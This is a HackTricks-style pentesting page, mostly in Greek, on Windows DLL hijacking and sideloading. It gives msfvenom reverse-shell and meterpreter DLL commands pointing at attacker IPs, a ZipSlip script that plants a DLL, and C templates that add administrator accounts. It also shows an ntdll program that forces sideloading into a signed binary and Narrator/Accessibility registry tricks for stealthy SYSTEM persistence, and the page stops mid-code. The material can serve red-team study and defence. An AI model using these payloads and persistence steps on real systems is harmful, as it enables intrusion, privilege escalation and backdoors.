# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει την παραποίηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος hijacking παραμένει η ίδια ανεξαρτήτως σκοπού.

### Συνηθισμένες Τεχνικές

Εφαρμόζονται αρκετές μέθοδοι για DLL hijacking, η κάθε μια με τη δική της αποτελεσματικότητα ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε ένα path αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το pattern αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που η εφαρμογή θα προσπαθήσει να φορτώσει, νομίζοντας ότι πρόκειται για ένα μη υπαρκτό απαραίτητο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο στο WinSxS directory, μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν φάκελο ελεγχόμενο από χρήστη μαζί με την αντιγραμμένη εφαρμογή, παρόμοιο με τεχνικές Binary Proxy Execution.

> [!TIP]
> Για μια βήμα-προς-βήμα αλυσίδα που στρώσει HTML staging, AES-CTR configs, και .NET implants πάνω σε DLL sideloading, δείτε το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Ο πιο συνηθισμένος τρόπος για να βρείτε missing Dlls μέσα σε ένα σύστημα είναι να τρέξετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ορίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να δείξετε μόνο την **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls γενικά** αφήνετε αυτό να τρέχει για μερικά **δευτερόλεπτα**.\
Αν ψάχνετε για έναν **missing dll μέσα σε ένα συγκεκριμένο εκτελέσιμο** θα πρέπει να ορίσετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε, και να σταματήσετε την καταγραφή των events**.

## Exploiting Missing Dlls

Για να κάνουμε privilege escalation, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα γίνει η αναζήτηση**. Επομένως, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** από τον φάκελο που βρίσκεται το **original dll** (παράξενο σενάριο), ή θα μπορέσουμε να **γράψουμε σε κάποιο φάκελο όπου θα αναζητηθεί το dll** και το original **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Στο** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **θα βρείτε πως φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows εφαρμογές** ψάχνουν για DLLs ακολουθώντας ένα σύνολο **προ-ορισμένων search paths**, τηρώντας μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking εμφανίζεται όταν ένα επιβλαβές DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι θα φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να βεβαιωθείτε ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε την **DLL search order σε 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την registry τιμή **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι enabled).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH** η αναζήτηση ξεκινάει στον κατάλογο του εκτελέσιμου module που φορτώνει το **LoadLibraryEx**.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί δηλώνοντας το absolute path αντί μόνο το όνομα**. Σε αυτή την περίπτωση το dll **θα αναζητηθεί μόνο σε αυτό το path** (αν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν σαν να φορτώθηκαν απλά με το όνομα).

Υπάρχουν και άλλοι τρόποι να τροποποιηθεί η σειρά αναζήτησης αλλά δεν θα τους εξηγήσω εδώ.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο παρακολουθούμενο inbox/share· όταν το scheduled task επανεκκινήσει τη διαδικασία, αυτή θα φορτώσει την κακόβουλη DLL και θα εκτελέσει τον κώδικά σας ως το service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε ντετερμινιστικά τη διαδρομή αναζήτησης DLL μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τις native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο υπό έλεγχο του επιτιθέμενου, μια διεργασία-στόχος που επιλύει ένα εισαγόμενο DLL με όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) μπορεί να αναγκαστεί να φορτώσει μια κακόβουλη DLL από αυτόν τον φάκελο.

Key idea
- Κατασκευάστε τις παραμέτρους διεργασίας με RtlCreateProcessParametersEx και παρέχετε ένα προσαρμοσμένο DllPath που δείχνει στο φάκελο υπό τον έλεγχό σας (π.χ. τον κατάλογο όπου βρίσκεται ο dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με RtlCreateUserProcess. Όταν το δυαδικό αρχείο-στόχος επιλύει ένα DLL με βάση το όνομα, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμα και όταν η κακόβουλη DLL δεν είναι colocated με το EXE-στόχο.

Notes/limitations
- Αυτό επηρεάζει τη διεργασία-παιδί που δημιουργείται· είναι διαφορετικό από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να κάνει LoadLibrary ενός DLL με όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση των LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι hardcoded απόλυτες διαδρομές δεν μπορούν να παραβιαστούν. Τα forwarded exports και το SxS μπορεί να αλλάξουν την προτεραιότητα.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή πραγματοποιεί proxy στο πραγματικό) στον κατάλογο DllPath.
- Εκκινήστε ένα υπογεγραμμένο εκτελέσιμο που είναι γνωστό ότι αναζητά xmllite.dll κατά όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο φορτωτής επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί σε πραγματικά περιστατικά να οδηγεί σε αλυσίδες multi-stage sideloading: ένας αρχικός launcher αποθέτει ένα βοηθητικό DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable εκτελέσιμο με custom DllPath για να αναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Εξαιρέσεις στην σειρά αναζήτησης DLL από την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν μια **DLL που μοιράζεται το όνομά της με ένα ήδη φορτωμένο στη μνήμη** εντοπίζεται, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντί γι' αυτό, εκτελεί έναν έλεγχο για redirection και ένα manifest πριν επιστρέψει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοση του known DLL, μαζί με οποιαδήποτε εξαρτώμενα DLLs, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των known DLLs.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα εξαρτώμενα DLLs διεξάγεται σαν να είχαν υποδειχθεί μόνο με τα **module names**, ανεξαρτήτως του αν το αρχικό DLL είχε αναγνωριστεί μέσω πλήρους διαδρομής.

### Αύξηση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal or lateral movement), στην οποία **λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** για οποιοδήποτε **directory** όπου το **DLL** θα **αναζητηθεί**. Αυτή η θέση μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Ναι, τα προαπαιτούμενα είναι δύσκολο να βρεθούν καθώς **κατά προεπιλογή είναι μάλλον παράξενο να βρεις ένα privileged εκτελέσιμο που του λείπει ένα DLL** και είναι ακόμη **πιο παράξενο να έχεις write permissions σε έναν φάκελο του system path** (συνήθως δεν μπορείς). Ωστόσο, σε κακώς διαμορφωμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να ελέγξετε το [UACME](https://github.com/hfiref0x/UACME) project. Ακόμα κι αν ο **κύριος στόχος του project είναι να παρακάμψει το UAC**, μπορεί να βρείτε εκεί ένα **PoC** για Dll hijacking για την έκδοση των Windows που χρησιμοποιείτε (πιθανώς απλά αλλάζοντας τη διαδρομή του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό για το πώς να **καταχραστείτε το Dll Hijacking για να αυξήσετε τα προνόμια** με δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε με επιτυχία είναι να **δημιουργήσετε ένα dll που να εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [αναβαθμίσετε από Medium Integrity level σε High **(παρακάμπτοντας UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking με έμφαση στην εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαραίτητες εξαγόμενες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, μεταβιβάζοντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε πρακτικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Αποκτήστε rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Απόκτησε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε πολλές περιπτώσεις το Dll που θα compile πρέπει να **export several functions** που θα φορτωθούν από τη victim process, αν αυτές οι functions δεν υπάρχουν το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL παράδειγμα με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να ελέγχει κατά την εκκίνηση ένα προβλέψιμο, γλωσσικά-ειδικό localization DLL που μπορεί να hijacked για arbitrary code execution και persistence.

Key facts
- Μονοπάτι ελέγχου (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλαιότερο μονοπάτι (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν υπάρχει εγγράψιμο attacker-controlled DLL στη OneCore διαδρομή, αυτό φορτώνεται και εκτελείται `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Ανακάλυψη με Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Μια πρόχειρη hijack θα εκφωνήσει/επισημάνει το UI. Για να παραμείνετε σιωπηλοί, κατά το attach απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάνετε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε το PoC για πλήρες κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει τη φυτεμένη DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσετε τον Narrator· η DLL σας εκτελείται ως SYSTEM στην secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Κάντε RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε τον Narrator· η DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η RDP συνεδρία κλείσει — inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη Accessibility Tool (AT) registry εγγραφή (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε οποιοδήποτε binary/DLL, να την εισάγετε, και μετά να ορίσετε το `configuration` σε εκείνο το όνομα AT. Αυτό παρέχει proxy για αυθαίρετη εκτέλεση υπό το Accessibility framework.

Notes
- Η εγγραφή κάτω από `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται σε `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί το scheduled task στις 9:30 AM υπό το context του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν το task εκτελείται, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή με medium integrity.
4. Συνδέστε τυπικές τεχνικές παράκαμψης UAC για να αναβαθμίσετε από medium integrity σε SYSTEM privileges.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό μια αξιόπιστη, υπογεγραμμένη διεργασία.

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει MSI. Μια CustomAction εκτελείται αθόρυβα κατά την GUI εγκατάσταση (π.χ., LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από embedded resources.
- Το dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο φάκελο (παράδειγμα ζεύγος: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το υπογεγραμμένο EXE ξεκινά, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον τρέχοντα φάκελο εργασίας, εκτελώντας κώδικα του επιτιθέμενου υπό υπογεγραμμένη γονική διεργασία (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Αναζητήστε εγγραφές που εκτελούν εκτελέσιμα ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ένα embedded αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), ελέγξτε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Embedded/split payloads in the MSI CAB:
- Διαχειριστική εξαγωγή: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποιήστε lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλαπλά μικρά τμήματα που συνενώνονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνηθισμένη ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτική sideloading με wsc_proxy.exe
- Αποθέστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος ψηφιακά υπογεγραμμένος host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό της.
- wsc.dll: attacker DLL. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να επαρκεί; διαφορετικά, κατασκευάστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ τρέχετε το payload στο DllMain.
- Κατασκευάστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
